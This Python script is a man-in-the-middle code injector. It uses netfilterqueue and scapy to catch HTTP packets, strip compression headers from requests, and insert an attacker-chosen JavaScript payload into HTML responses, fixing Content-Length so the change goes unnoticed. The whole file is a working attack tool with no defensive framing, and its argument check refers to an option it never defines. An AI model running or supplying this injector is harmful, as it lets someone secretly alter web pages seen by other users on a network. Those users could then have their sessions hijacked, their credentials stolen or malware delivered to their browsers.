import netfilterqueue
import re
import optparse
import scapy.all as scapy

ack_list = []
js_payload = ""

def get_arguments():
    global js_payload

    parser = optparse.OptionParser()
    parser.add_option("-p", "--payload", dest = "payload", help = "Payload to be injected.")
    (options, arguments) = parser.parse_args()

    if not options.interface:
        parser.error("[-] Please specify the payload, use --help for more info.")

    js_payload = options.payload

def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum

    return packet

def process_packet(packet):
    global js_payload
    scapy_packet = scapy.IP(packet.get_payload())

    if scapy_packet.haslayer(scapy.Raw):
        load = scapy_packet[scapy.Raw].load
        if scapy_packet[scapy.TCP].dport == 80:
            print("\033[94m[+]\033[0m Request")
            load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
        elif scapy_packet[scapy.TCP].sport == 80:
            print("\033[94m[+]\033[0m Response")
            load = load.replace("</body>", js_payload + "</body>")
            len_search = re.search("(?:Content-Length:\s)(\d*)", load)

            if len_search and "text/html" in load:
                len_content = len_search.group(1)
                new_len = int(len_content) + len(js_payload)
                load = load.replace(len_content, str(new_len))

        if load != scapy_packet[scapy.Raw].load:
            new_packet = set_load(scapy_packet, load)
            packet.set_payload(str(new_packet))

    packet.accept()

get_arguments()
queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
